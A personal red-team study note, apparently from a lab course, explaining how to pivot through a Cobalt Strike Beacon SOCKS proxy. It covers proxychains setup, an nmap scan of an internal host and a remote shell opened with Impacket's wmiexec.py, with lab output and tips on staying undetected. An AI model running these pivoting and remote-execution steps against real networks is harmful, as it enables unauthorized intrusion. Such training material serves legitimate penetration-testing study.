---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[SOCKS Proxies]]  
___

## Description:  

### CobaltStrike SOCKS proxy

A SOCKS (Secure Socket) Proxy exchanges network packets between a client and a server via a "proxy".

This is particularly helpful when we want to leverage Linux-based toolsets such as [Impacket](https://github.com/SecureAuthCorp/impacket).

 It also carries additional OPSEC advantages - since we're not pushing offensive tooling onto the target or even executing any code on a compromised endpoint, it can shrink our footprint for detection.

To start a socks proxy, use `socks [port]` on a Beacon.

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```
This will bind port 1080 on the Team Server.

Open `/etc/proxychains.conf` and change `socks4 127.0.0.1 9050`. Change `9050` to `1080` (or whichever port you're using).


To tunnel a tool through proxychains, it's as simple as `proxychains [tool] [tool args]`.

Before running commands run `sleep 0` in beacon to set it to interactive mode. After you run command set it back to `sleep 15`.

```
beacon> sleep 0
```


 ICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for nmap to work.

```
root@kali:~# proxychains -q nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

Interactive shell through proxychains

```
root@kali:~# proxychains python3 /usr/local/bin/wmiexec.py DEV/bfarmer@10.10.17.25
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:49682-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
dev\bfarmer

C:\>hostname
srv-1

```





___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (09:50 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
